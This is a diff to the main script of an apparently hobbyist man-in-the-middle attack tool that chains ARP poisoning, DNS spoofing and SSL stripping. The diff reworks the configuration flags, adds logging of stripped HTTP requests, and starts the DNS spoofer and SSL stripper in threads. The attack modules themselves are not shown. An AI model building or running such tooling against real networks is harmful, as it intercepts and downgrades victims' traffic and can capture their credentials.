@@ -3,7 +3,7 @@ import signal
 import threading
 from termcolor import colored
 from scripts.arp_poisoner import ArpPoisoner
-from scripts.dns_poisoner import DnsSpoofer
+from scripts.dns_spoofer import DnsSpoofer
 from scripts.ssl_stripper import SslStripper
 
 VERSION = "1.0"
@@ -16,11 +16,12 @@ CONFIG = {
         "ignore_cache": False  # Ignore ARP cache when looking up MAC addresses
     },
     "dns": {
-        "hosts": None,
-        "spoofing": False # Performing dns spoofing
-    }, 
+        "disable": False,  # Disable DNS spoofing
+        "hosts": None
+    },
     "ssl": {
         "disable": False,  # Disable SSL stripping
+        "logging": True,  # Log all requests to a log file
         "port": 80  # Port to listen for spoofed webserver traffic
     }
 }
@@ -55,15 +56,16 @@ def parse_args():
             elif arg[0] == "-aC":
                 CONFIG["arp"]["ignore_cache"] = True
             elif arg[0] == "-d":
-                hostFile = open(arg[1].encode('unicode_escape'), "r")    
-                content = hostFile.readlines()   
-                hostList = []  
-                for i in content:
-                    hostList.append(i.rstrip('\n'))
-                CONFIG["dns"]["hosts"] = hostList
-                CONFIG["dns"]["spoofing"] = True
+                hosts_file = open(arg[1].encode('unicode_escape'), "r")
+                content = hosts_file.readlines()
+                hosts_list = []
+                for j in content:
+                    hosts_list.append(j.rstrip('\n'))
+                CONFIG["dns"]["hosts"] = hosts_list
             elif arg[0] == "-sD":
                 CONFIG["ssl"]["disable"] = True
+            elif arg[0] == "-sL":
+                CONFIG["ssl"]["logging"] = False
             elif arg[0] == "-sP":
                 CONFIG["ssl"]["port"] = int(arg[1])
             else:
@@ -135,22 +137,25 @@ def start():
     t1.daemon = True
     t1.start()  
 
-    # RUN ADDITIONAL SCRIPTS HERE
-    
-    disable_ssl = CONFIG["ssl"]["disable"]
+    disable_dns = CONFIG["dns"]["disable"]
 
-    if not disable_ssl:
-        ssl_port = CONFIG["ssl"]["port"]
+    # Run DNS poisoning script with configured parameters
+    if not disable_dns:
+        dns_hosts = CONFIG["dns"]["hosts"]
 
-        ssl_stripper = SslStripper(ssl_port)
-        ssl_stripper.start()
-
-    # Run DNS poisoning script
-    if (CONFIG["dns"]["spoofing"]):
-        dns_poisoner = DnsSpoofer(CONFIG["dns"]["hosts"])
+        dns_poisoner = DnsSpoofer(dns_hosts)
         t2 = threading.Thread(target=lambda: dns_poisoner.start())
         t2.daemon = True
         t2.start()
+
+        disable_ssl = CONFIG["ssl"]["disable"]
+
+        if not disable_ssl:
+            ssl_port = CONFIG["ssl"]["port"]
+            logging = CONFIG["ssl"]["logging"]
+
+            ssl_stripper = SslStripper(ssl_port, logging)
+            ssl_stripper.start()
     
     while True:  # Keep the program running
         pass
